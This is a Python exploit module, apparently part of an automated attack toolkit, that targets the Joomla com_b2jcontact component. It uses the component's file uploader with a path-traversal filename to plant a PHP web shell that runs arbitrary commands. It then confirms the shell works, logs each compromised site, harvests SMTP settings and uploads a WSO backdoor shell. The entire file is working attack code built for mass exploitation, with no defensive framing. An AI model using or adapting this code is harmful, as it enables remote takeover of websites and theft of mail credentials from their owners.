# coding=utf-8
import requests
import printModule
import getSMTP
import wsoShellUploaderModule

payloadshell = '"Neko!!<?php {});?>"'.format("system({}".format('$_GET["cmd"]'))
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def Exploit(site):
    try:
        requests.post('http://' + site + '/index.php?option=com_b2jcontact&view=loader&type=uploader&'
                                         'owner=component&bid=1&qqfile=/../../../neko.php',
                      data=payloadshell, timeout=10, headers=Headers)
        CheckSh = requests.get('http://' + site +'/components/com_b2jcontact/neko.php', timeout=10, headers=Headers)

        if 'neko!!' in str(CheckSh.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write(site + '/components/com_b2jcontact/neko.php?cmd=uname -a' + '\n')
            getSMTP.JooomlaSMTPshell(site + '/components/com_b2jcontact/neko.php?cmd=id')
            WSo = wsoShellUploaderModule.UploadWso(site + '/components/com_b2jcontact/neko.php?cmd=id')
            if WSo == 'No':
                pass
            else:
                with open('result/WSo_Shell.txt', 'a') as Wr:
                    Wr.write('{}\n'.format(WSo))
            return printModule.returnYes(site, 'N/A', 'Com_b2jcontact', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_b2jcontact', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_b2jcontact', 'Joomla')
